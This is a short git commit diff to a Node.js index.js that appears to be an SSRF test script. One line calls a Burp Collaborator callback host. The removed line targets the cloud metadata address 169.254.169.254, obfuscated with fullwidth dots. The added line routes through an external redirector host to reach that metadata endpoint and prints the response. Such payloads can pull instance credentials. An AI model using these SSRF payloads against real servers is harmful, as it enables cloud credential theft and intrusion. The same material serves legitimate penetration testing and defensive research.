24d6d0b31fe8e181f1a14bc733a08edc46916ce4
hussein98d <daher-hussein@hotmail.fr>
2021-07-14 14:23:00 +0000

    Update index.js

--- index.js
+++ index.js
@@ -49,7 +49,7 @@ request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=St
 */
 var request = require('request');
 followAllRedirects: true,
-request('http://169｡254｡169｡254/', function (error, response, body) {
+request('https://ssrf.localdomain.pw/xml-without-body/301-http-169.254.169.254:80-.x.xml', function (error, response, body) {
   if (1 == 1) {
     console.log(response.statusCode);
     console.log(response.body);    // Prints the JSON object
